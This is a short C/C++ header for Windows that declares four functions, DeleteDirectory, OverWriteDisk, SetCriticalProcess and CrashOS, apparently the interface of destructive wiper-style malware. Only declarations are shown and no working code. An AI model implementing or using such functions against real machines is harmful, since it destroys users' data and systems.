#pragma once

#include <Windows.h>
#include <AclAPI.h>

extern void DeleteDirectory(LPWSTR Directory);
extern void OverWriteDisk();
extern void SetCriticalProcess();
extern void CrashOS();